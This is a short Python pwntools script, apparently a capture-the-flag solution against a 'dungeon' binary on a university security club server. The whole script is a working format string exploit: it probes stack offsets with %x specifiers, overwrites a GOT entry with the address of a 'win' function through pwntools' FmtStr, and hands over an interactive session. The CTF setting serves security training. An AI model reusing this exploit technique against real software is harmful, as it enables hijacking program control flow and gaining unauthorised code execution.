from pwn import *

l = ["..%"+str(i+355)+"$x" for i in range(20)]
# p = process('./dungeon')
p = remote('ctf.unswsecurity.com','7001')
p.recvuntil("> ")
# p.sendline(".AAAA"+'%13$x.'+''.join(l))
# q = p.recvline()
# print q
# pause()
winAd = 0x8048a31
gotAd = 0x804b018
gotAd = 0x804b024
def pay(q):
    p.sendline(q)
    log.info(repr(q))
form = FmtStr(execute_fmt=pay, offset=13, padlen=1)
form.write(gotAd, winAd)
form.execute_writes()
p.interactive()

